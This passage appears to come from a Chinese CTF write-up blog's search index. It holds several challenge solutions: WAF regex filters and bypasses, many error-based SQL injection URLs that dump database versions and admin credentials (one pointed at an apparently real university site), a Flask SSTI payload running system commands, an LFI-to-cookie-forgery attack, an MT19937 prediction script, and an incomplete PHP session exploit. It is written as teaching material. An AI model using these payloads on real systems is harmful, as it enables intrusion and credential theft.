\"/<.*=(&#\\\\d+?;?)+?>|<.*data=data:text\\\\/html.*>|\\\\b(alert\\\\(|confirm\\\\(|expression\\\\(|prompt\\\\(|benchmark\\s*?\\(.*\\)|sleep\\s*?\\(.*\\)|\\\\b(group_)?concat[\\\\s\\\\/\\\\*]*?\\\\([^\\\\)]+?\\\\)|\\bcase[\\s\\/\\*]*?when[\\s\\/\\*]*?\\([^\\)]+?\\)|load_file\\s*?\\\\()|<[^>]*?\\\\b(onerror|onmousemove|onload|onclick|onmouseover)\\\\b|\\\\b(and|or)\\\\b\\\\s*?([\\\\(\\\\)'\\\"\\\\d]+?=[\\\\(\\\\)'\\\"\\\\d]+?|[\\\\(\\\\)'\\\"a-zA-Z]+?=[\\\\(\\\\)'\\\"a-zA-Z]+?|>|<|\\s+?[\\\\w]+?\\\\s+?\\\\bin\\\\b\\\\s*?\\(|\\\\blike\\\\b\\\\s+?[\\\"'])|\\\\/\\\\*.*\\\\*\\\\/|<\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT\\s*(\\(.+\\)\\s*|@{1,2}.+?\\s*|\\s+?.+?|(`|'|\\\").*?(`|'|\\\")\\s*)|UPDATE\\s*(\\(.+\\)\\s*|@{1,2}.+?\\s*|\\s+?.+?|(`|'|\\\").*?(`|'|\\\")\\s*)SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE)(\\\\(.+\\\\)|\\\\s+?.+?\\\\s+?|(`|'|\\\").*?(`|'|\\\"))FROM(\\\\(.+\\\\)|\\\\s+?.+?|(`|'|\\\").*?(`|'|\\\"))|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)/i\";\n<p>UNION正则没有\\s，可以用%0a %a0 %0b %0c %0d 绕过UNION， select 后面可以接<code>+(%2b) - ! ~ @ &#123;&#125;</code> select{s`passwd`}from user 1 select~passwd from user </p>\n<h2 id=\"section-2\">03</h2>\n$filter = \"/[^\\\\{\\\\s]{1}(\\\\s|\\\\b)+(?:select\\\\b|update\\\\b|insert(?:(\\\\/\\\\*.*?\\\\*\\\\/)|(\\\\s)|(\\\\+))+into\\\\b).+?(?:from\\\\b|set\\\\b)|[^\\\\{\\\\s]{1}(\\\\s|\\\\b)+(?:create|delete|drop|truncate|rename|desc)(?:(\\\\/\\\\*.*?\\\\*\\\\/)|(\\\\s)|(\\\\+))+(?:table\\\\b|from\\\\b|database\\\\b)|into(?:(\\\\/\\\\*.*?\\\\*\\\\/)|\\\\s|\\\\+)+(?:dump|out)file\\\\b|\\\\bsleep\\\\([\\\\s]*[\\\\d]+[\\\\s]*\\\\)|benchmark\\\\(([^\\\\,]*)\\\\,([^\\\\,]*)\\\\)|(?:declare|set|select)\\\\b.*@|union\\\\b.*(?:select|all)\\\\b|(?:select|update|insert|create|delete|drop|grant|truncate|rename|exec|desc|from|table|database|set|where)\\\\b.*(charset|ascii|bin|char|uncompress|concat|concat_ws|conv|export_set|hex|instr|left|load_file|locate|mid|sub|substring|oct|reverse|right|unhex)\\\\(|(?:master\\\\.\\\\.sysdatabases|msysaccessobjects|msysqueries|sysmodules|mysql\\\\.db|sys\\\\.database_name|information_schema\\\\.|sysobjects|sp_makewebtask|xp_cmdshell|sp_oamethod|sp_addextendedproc|sp_oacreate|xp_regread|sys\\\\.dbms_export_extension)/i\";\n\n<p>\\b指单词边界，用内联注释/<em>!50000union</em>/绕过 %0aunion%0aselect%0a1,2,3,4%23</p>\n<h2 id=\"不能使用information_schema时\">04 不能使用information_schema时</h2>\n\n$filter = \"/union|and|\\bor\\b|information_schema|updatexml/i\";\n\n<p>首先报错注入爆表名 admin'||linestring(id)%23 admin'||polygon(id)%23 然后爆列名 admin'||(select * from(select * from waf04 as a join waf04 as b c)%23 得到第一个列名，然后填到using里： admin'||(select * from(select * from waf04 as a join waf04 as b using(id))c)%23 admin' || (select * from(select * from waf04 as a join waf04 as b using(id,password))c)%23 or被过滤，用in admin' in (select * from(select * from waf04 as a join waf04 as b using(id,password))c)%23</p>\n<h1 id=\"floor等报错注入\">floor等报错注入</h1>\n<p>1、通过floor暴错</p>\n<p>/<em>数据库版本</em>/</p>\n<p>SQL http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(<em>),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) /<em>连接用户</em>/</p>\n<p>SQL http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(<em>),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) /<em>连接数据库</em>/</p>\n<p>SQL http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(<em>),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) /<em>暴库</em>/</p>\n<p>SQL http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) /<em>暴表</em>/</p>\n<p>SQL http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) /<em>暴字段</em>/</p>\n<p>SQL http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) /<em>暴内容</em>/</p>\n<p>SQL http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) 2、ExtractValue(有长度限制,最长32位)</p>\n<p>SQL http://www.hackblog.cn/sql.php?id=1 and extractvalue(1, concat(0x7e, (select @<span class=\"citation\" data-cites=\"version\">@version</span>),0x7e)) http://www.hackblog.cn/sql.php?id=1 and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1))) 3、UpdateXml(有长度限制,最长32位)</p>\n<p>SQL http://www.hackblog.cn/sql.php?id=1 and updatexml(1,concat(0x7e,(SELECT @<span class=\"citation\" data-cites=\"version\">@version</span>),0x7e),1) http://www.hackblog.cn/sql.php?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1) 4、NAME_CONST(适用于低版本)</p>\n<p>SQL http://wlkc.zjtie.edu.cn/qcwh/content/detail.php?id=330&amp;sid=19&amp;cid=261 and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- 5、Error based Double Query Injection (http://www.vaibs.in/error-based-double-query-injection/)</p>\n<p>/<em>数据库版本</em>/</p>\n<p>SQL http://www.hackblog.cn/sql.php?id=1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1 6、Multipoint(新方法)</p>\n<p>/<em>数据库版本</em>/</p>\n<p>SQL http://www.hackblog.cn/sql.php?id=1 and 1=(select multipoint((select * from(select * from(select version())f)x)))</p>\n\n    <div id=\"aplayer-pdVlRDuV\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"437752615\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\n<p>flag{8ce6f77b-a046-43e4-88c8-44d53f7df4c4}</p>\n","categories":["Writeups"]},{"title":"PASECACTF 2019 Flask_SSTI","url":"/2019/09/10/PASECACTF-2019-Flask-SSTI/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>一道Flask SSTI的题。 打开后允许我们输入东西，会返回用奇怪字符包裹的昵称。 我们试一下{{1*2}}，然后返回2。那么有SSTI。我们读一下config，提交{{config}}。返回结果中确实有flag，但是是乱码。看来要读一下文件了。 <a id=\"more\"></a> Fuzz一下，发现<code>_</code>、<code>.</code>和<code>'</code>不让用，那就用这个吧：{{()[\"\\x5F\\x5Fclass\\x5F\\x5F\"][\"\\x5F\\x5Fbases\\x5F\\x5F\"][0][\"\\x5F\\x5Fsubclasses\\x5F\\x5F\"]()[80][\"load\\x5Fmodule\"](\"os\")[\"system\"](\"ls\")}}，其中<code>[80]</code>指的是_frozen_importlib.BuiltinImporter。这样我们不会得到输出，但我们可以借助外部VPS，wget一个文件。 然后我们得到app.py，读文件。{{()[\"\\x5F\\x5Fclass\\x5F\\x5F\"][\"\\x5F\\x5Fbases\\x5F\\x5F\"][0][\"\\x5F\\x5Fsubclasses\\x5F\\x5F\"]()[91][\"get\\x5Fdata\"](0, \"app\\x2Epy\")}}，就可以得到app.py文件内容。反推flag即可。</p>\r\n\n    <div id=\"aplayer-UpnDlVLQ\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"5042952\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{cf97ac55-0329-4867-bbbe-2fad08c6009b}</p>\r\n","categories":["Writeups"],"tags":["Web","Python","SSTI","Flask"]},{"title":"PASECACTF-2019-Honey_shop","url":"/2019/10/19/PASECACTF-2019-Honey-shop/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>PASECA CTF 2019的Honey_shop。还算是简单。</p>\r\n<p>打开网页，是个商店网页，我们拥有1336元，但是要购买Flag需要1337元。</p>\r\n<p>我们注意到有一句“click to download our sweet images”，发现访问的是/download?image=2.jpg，这样就可能出现LFI。 <a id=\"more\"></a> <img src=\"/2019/10/19/PASECACTF-2019-Honey-shop/LFI.png\" class=\"\" title=\"LFI\"></p>\r\n<p>我们成功读到了/etc/passwd，那么接下来读什么呢？目前我们也无法触发有关Flask的任何报错信息，找不到其路径。那就只能试着读一下/proc的相关信息了。</p>\r\n<p>/proc/self/永远指向当前进程，我们尝试读一下environ文件，这记录着当前进程（本题而言是python）的环境变量信息。</p>\r\n<img src=\"/2019/10/19/PASECACTF-2019-Honey-shop/environ.png\" class=\"\" title=\"&#x2F;proc&#x2F;self&#x2F;environ\">\r\n<p>看到有SECRET_KEY，猜测这是用来加密Flask的Cookie的。那么，Cookie我们就可以解密了。利用之前提到过的<a href=\"https://github.com/noraj/flask-session-cookie-manager\">这个</a>，我们可以解出Cookie的内容<code>b'&#123;\"balance\":1336,\"purchases\":[]&#125;'</code>，那么我们把balance改成1338就可以购买flag了。</p>\r\n<img src=\"/2019/10/19/PASECACTF-2019-Honey-shop/Buy_flag.png\" class=\"\" title=\"Buy flag\">\r\n<p>需要注意的是那个脚本对Python版本有一定的限制，最好是在Python 3.6 Linux下运行。</p>\r\n\n    <div id=\"aplayer-RLTfzHRs\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"29732659\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{885c84f2-b753-435d-95e1-44de4614dbc3}</p>\r\n","categories":["Writeups"],"tags":["Python.Flask","Cookie","LFI"]},{"title":"PASECACTF 2019 Tornado_Casino","url":"/2019/09/10/PASECACTF-2019-Tornado-Casino/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>久违的来一道Crypto。 给出了代码： <a id=\"more\"></a> <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sys <span class=\"keyword\">import</span> argv</span><br><span class=\"line\"><span class=\"keyword\">from</span> random <span class=\"keyword\">import</span> getrandbits</span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"string\">&#x27;&lt;redacted&gt;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">tornado_banner = <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">                                                              88              </span></span><br><span class=\"line\"><span class=\"string\">  ,d                                                          88              </span></span><br><span class=\"line\"><span class=\"string\">  88                                                          88              </span></span><br><span class=\"line\"><span class=\"string\">MM88MMM ,adPPYba,  8b,dPPYba, 8b,dPPYba,  ,adPPYYba,  ,adPPYb,88  ,adPPYba,   </span></span><br><span class=\"line\"><span class=\"string\">  88   a8&quot;     &quot;8a 88P&#x27;   &quot;Y8 88P&#x27;   `&quot;8a &quot;&quot;     `Y8 a8&quot;    `Y88 a8&quot;     &quot;8a  </span></span><br><span class=\"line\"><span class=\"string\">  88   8b       d8 88         88       88 ,adPPPPP88 8b       88 8b       d8  </span></span><br><span class=\"line\"><span class=\"string\">  88,  &quot;8a,   ,a8&quot; 88         88       88 88,    ,88 &quot;8a,   ,d88 &quot;8a,   ,a8&quot;  </span></span><br><span class=\"line\"><span class=\"string\">  &quot;Y888 `&quot;YbbdP&quot;&#x27;  88         88       88 `&quot;8bbdP&quot;Y8  `&quot;8bbdP&quot;Y8  `&quot;YbbdP&quot;&#x27; &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">casino_banner = <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">                                88                          </span></span><br><span class=\"line\"><span class=\"string\">                                &quot;&quot;                          </span></span><br><span class=\"line\"><span class=\"string\">                                                            </span></span><br><span class=\"line\"><span class=\"string\"> ,adPPYba, ,adPPYYba, ,adPPYba, 88 8b,dPPYba,   ,adPPYba,   </span></span><br><span class=\"line\"><span class=\"string\">a8&quot;     &quot;&quot; &quot;&quot;     `Y8 I8[    &quot;&quot; 88 88P\\&#x27;   `&quot;8a a8&quot;     &quot;8a  </span></span><br><span class=\"line\"><span class=\"string\">8b         ,adPPPPP88  `&quot;Y8ba,  88 88       88 8b       d8  </span></span><br><span class=\"line\"><span class=\"string\">&quot;8a,   ,aa 88,    ,88 aa    ]8I 88 88       88 &quot;8a,   ,a8&quot;  </span></span><br><span class=\"line\"><span class=\"string\"> `&quot;Ybbd8&quot;&#x27; `&quot;8bbdP&quot;Y8 `&quot;YbbdP&quot;\\&#x27; 88 88       88  `&quot;YbbdP&quot;\\&#x27; &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">tornado_art = <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">   ((  &quot;####@@!!$$    ))</span></span><br><span class=\"line\"><span class=\"string\">       `#####@@!$$`  ))</span></span><br><span class=\"line\"><span class=\"string\">    ((  &#x27;####@!!$:</span></span><br><span class=\"line\"><span class=\"string\">   ((  ,####@!!$:   ))</span></span><br><span class=\"line\"><span class=\"string\">       .###@!!$:</span></span><br><span class=\"line\"><span class=\"string\">       `##@@!$:</span></span><br><span class=\"line\"><span class=\"string\">        `#@!!$</span></span><br><span class=\"line\"><span class=\"string\">  !@#    `#@!$:       @#$</span></span><br><span class=\"line\"><span class=\"string\">   #$     `#@!$:       !@!</span></span><br><span class=\"line\"><span class=\"string\">            &#x27;@!$:</span></span><br><span class=\"line\"><span class=\"string\">        &#x27;`\\   &quot;!$: /`&#x27;</span></span><br><span class=\"line\"><span class=\"string\">           &#x27;\\  &#x27;!: /&#x27;</span></span><br><span class=\"line\"><span class=\"string\">             &quot;\\ : /&quot;</span></span><br><span class=\"line\"><span class=\"string\">  -.&quot;-/\\\\\\-.&quot;//.-&quot;/:`\\.&quot;-.JrS&quot;.&quot;-=_\\\\</span></span><br><span class=\"line\"><span class=\"string\">&quot; -.&quot;-.\\\\&quot;-.&quot;//.-&quot;.`-.&quot;_\\\\-.&quot;.-\\&quot;.-//&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">welcome = <span class=\"string\">&#x27;Welcome!\\n[1] - To slotmachine\\n[2] - Enter promocode\\n[3] - Exit\\n&#x27;</span><span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">sltmchn_wndw</span>(<span class=\"params\">num</span>):</span></span><br><span class=\"line\">    print(num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;|&#x27;</span> + <span class=\"string\">&#x27;|&#x27;</span>.join(list(hex(num)[<span class=\"number\">2</span>:].zfill(<span class=\"number\">8</span>))) + <span class=\"string\">&#x27;|&#x27;</span></span><br><span class=\"line\">slotmachine_menu = <span class=\"string\">&#x27;[$] - $$$SPIN$$$\\n&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(tornado_banner)</span><br><span class=\"line\">print(casino_banner)</span><br><span class=\"line\">print(tornado_art)</span><br><span class=\"line\">user_balance = <span class=\"number\">10</span><span class=\"comment\">#$</span></span><br><span class=\"line\">promo = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    choice1 = input(welcome)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> choice1 == <span class=\"string\">&#x27;1&#x27;</span>:</span><br><span class=\"line\">        print(<span class=\"string\">&#x27;$$$Its point of no return!$$$\\n$$$     all or nothing    $$$\\n&#x27;</span>)</span><br><span class=\"line\">        print(<span class=\"string\">f&#x27;Your balance: <span class=\"subst\">&#123;user_balance&#125;</span>&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> user_balance &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">                spin = input(slotmachine_menu)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> spin == <span class=\"string\">&#x27;$&#x27;</span>:</span><br><span class=\"line\">                    state = getrandbits(<span class=\"number\">32</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                        pff_try = int(input(<span class=\"string\">&#x27;It will be: &#x27;</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">                        exit(<span class=\"number\">0</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> pff_try == state:</span><br><span class=\"line\">                        print(sltmchn_wndw(state))</span><br><span class=\"line\">                        print(<span class=\"string\">&#x27;OMGWTF$$$$$$$$$$$$&#x27;</span>)</span><br><span class=\"line\">                        print(flag)</span><br><span class=\"line\">                        exit(<span class=\"number\">0</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                        print(sltmchn_wndw(state))</span><br><span class=\"line\">                        print(<span class=\"string\">&#x27;Nice try!&#x27;</span>)</span><br><span class=\"line\">                        user_balance -= <span class=\"number\">1</span></span><br><span class=\"line\">                        print(<span class=\"string\">f&#x27;Your balance: <span class=\"subst\">&#123;user_balance&#125;</span>&#x27;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    exit(<span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                print(<span class=\"string\">&#x27;Sorry!&#x27;</span>)</span><br><span class=\"line\">                exit(<span class=\"number\">0</span>)</span><br><span class=\"line\">                    </span><br><span class=\"line\">    <span class=\"keyword\">elif</span> choice1 == <span class=\"string\">&#x27;2&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> promo:</span><br><span class=\"line\">            promo = input(<span class=\"string\">&#x27;Enter your promocode: &#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> promo == <span class=\"string\">&#x27;b33_1_4m_b3333&#x27;</span>:</span><br><span class=\"line\">                print(<span class=\"string\">&#x27;Great!&#x27;</span>)</span><br><span class=\"line\">                user_balance += <span class=\"number\">1000</span><span class=\"comment\">#$</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">&#x27;Only once!&#x27;</span>)</span><br><span class=\"line\">            </span><br><span class=\"line\">    <span class=\"keyword\">elif</span> choice1 == <span class=\"string\">&#x27;3&#x27;</span>:</span><br><span class=\"line\">        exit(<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure> 流程很简单，每次他会用random.getrandbits(32)来生成随机数，我们只要猜中就会得到flag。 之前我们提到过，Python中random.getrandbits()使用的是MT19937算法，因此我们只要获得连续的624组随机数数据，我们就可以准确获得下一个。 代码如下： <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> mt19937predictor <span class=\"keyword\">import</span> MT19937Predictor</span><br><span class=\"line\"></span><br><span class=\"line\">ip = <span class=\"string\">&#x27;127.0.0.1&#x27;</span></span><br><span class=\"line\">port = <span class=\"string\">&#x27;25028&#x27;</span></span><br><span class=\"line\">c = connect(ip, port)</span><br><span class=\"line\">print(type(c))</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">predictor = MT19937Predictor()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">promo</span>(<span class=\"params\">c</span>):</span></span><br><span class=\"line\">    c.recvuntil(<span class=\"string\">&quot;Welcome&quot;</span>)</span><br><span class=\"line\">    c.recvline()</span><br><span class=\"line\">    c.recvline()</span><br><span class=\"line\">    c.recvline()</span><br><span class=\"line\">    c.recvline()</span><br><span class=\"line\">    c.sendline(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    c.recvuntil(<span class=\"string\">&#x27;Enter your promocode:&#x27;</span>)</span><br><span class=\"line\">    c.sendline(<span class=\"string\">&quot;b33_1_4m_b3333&quot;</span>)</span><br><span class=\"line\">    print(c.recvline())</span><br><span class=\"line\"></span><br><span class=\"line\">result = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">attack</span>(<span class=\"params\">c</span>):</span></span><br><span class=\"line\">    c.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    c.recvline()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">625</span>):</span><br><span class=\"line\">        c.sendline(<span class=\"string\">&#x27;$&#x27;</span>)</span><br><span class=\"line\">        c.recvuntil(<span class=\"string\">&#x27;It will be:&#x27;</span>)</span><br><span class=\"line\">        c.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">        temp_result = c.recvline()</span><br><span class=\"line\">        result.append(int(temp_result[:<span class=\"number\">-1</span>].replace(<span class=\"string\">&#x27;|&#x27;</span>, <span class=\"string\">&quot;&quot;</span>),<span class=\"number\">16</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    promo(c)</span><br><span class=\"line\">    attack(c)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">625</span>):</span><br><span class=\"line\">        predictor.setrandbits(result[i],<span class=\"number\">32</span>)</span><br><span class=\"line\">    print(result)</span><br><span class=\"line\">    final=predictor.getrandbits(<span class=\"number\">32</span>)</span><br><span class=\"line\">    c.sendline(<span class=\"string\">&#x27;$&#x27;</span>)</span><br><span class=\"line\">    c.recvuntil(<span class=\"string\">&#x27;It will be:&#x27;</span>)</span><br><span class=\"line\">    c.sendline(hex(final)[<span class=\"number\">2</span>:])</span><br><span class=\"line\">    print(c.recvline())</span><br></pre></td></tr></table></figure></p>\r\n\n    <div id=\"aplayer-KLhgLsce\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"561493928\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{6169ce2a-c2f5-46cf-9094-fa83b3b3c066}</p>\r\n","categories":["Writeups"],"tags":["Crypto","MT19937"]},{"title":"PwnThyBytes 2019 Baby sql is not baby anymore","url":"/2019/10/08/PwnThyBytes-2019-Baby-sql-is-not-baby-anymore/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>PwnThyBytes 2019的Baby sql is not baby anymore。名字够长的。猜一下是SQL注入的题。</p>\r\n<p>功能很简单的，一个登陆一个注册，登陆完只有一句提示，没有其他内容。不过提示了个source.zip。</p>\r\n<p>看一下源码，index.php里有个filter()函数。 <a id=\"more\"></a> <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span>(<span class=\"params\">$value</span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    !is_string($value) <span class=\"keyword\">AND</span> <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Hacking attempt!&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> addslashes($value);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\r\n<p>只用了addslashes处理了POST和GET参数，对SQL注入基本没有任何障碍。login.php那里也没有任何其他过滤。关于绕过addslashes注入可参考<a href=\"https://lonewolfzero.wordpress.com/2017/07/03/addslashes-multibyte-sql-injection-mysql-and-php-case-study/\">这个</a>和<a href=\"https://bbs.ichunqiu.com/thread-10899-1-1.html\">这个</a>。但就像参考文献所说的那样，addslashes绕过需要有一些特定条件，如MySQL使用GBK编码，或其他问题，但是这里没有，看网页编码似乎它用的UTF-8，不是GBK。因此我们需要其他的绕过方式。</p>\r\n<p>我们注意到在templates下的PHP文件都有一句话：<code>!isset($_SESSION) AND die(\"Direct access on this script is not allowed!\");</code>，那么这句话能否绕过？</p>\r\n<p><span class=\"math inline\">\\(\\_SESSION数组在session_start()初始化后才产生。因此我们直接访问templates下的，\\)</span>_SESSION还不存在。那么，如果我们直接传入SESSION呢？ <span class=\"github-emoji\" data-alias=\"orange\" style=\"\" data-fallback-src=\"https://github.githubassets.com/images/icons/emoji/unicode/1f34a.png?v8\">🍊</span> 在HITCON 2018的时候出了一道<a href=\"https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html#session-tragedy\">One line php</a>，其中涉及到一个PHP SESSION的细节：如果在php.ini中设置session.auto_start=On，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是session.auto_start默认为Off。与Session相关的另一个选项叫session.upload_progress.enabled，默认为On，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()（具体请参考<a href=\"https://www.php.net/manual/en/session.upload-progress.php\">这里</a>）。</p>\r\n<p>那么，我们传入multipart的POST包试试看。这个很简单，用requests配合files参数就可以了。</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://192.168.1.2:6385/templates/login.php&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">files = &#123;<span class=\"string\">&quot;file&quot;</span>: <span class=\"string\">&quot;123456789&quot;</span>&#125;</span><br><span class=\"line\">a = requests.post(url=url, files=files, data=&#123;<span class=\"string\">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class=\"string\">&quot;123456789&quot;</span>&#125;,</span><br><span class=\"line\">                  cookies=&#123;<span class=\"string\">&quot;PHPSESSID&quot;</span>: <span class=\"string\">&quot;test1&quot;</span>&#125;, params=&#123;<span class=\"string\">&#x27;username&#x27;</span>: <span class=\"string\">&#x27;test&#x27;</span>, <span class=\"string\">&#x27;password&#x27;</span>: <span class=\"string\">&#x27;test&#x27;</span>&#125;,</span><br><span class=\"line\">                  proxies=&#123;<span class=\"string\">&#x27;http&#x27;</span>: <span 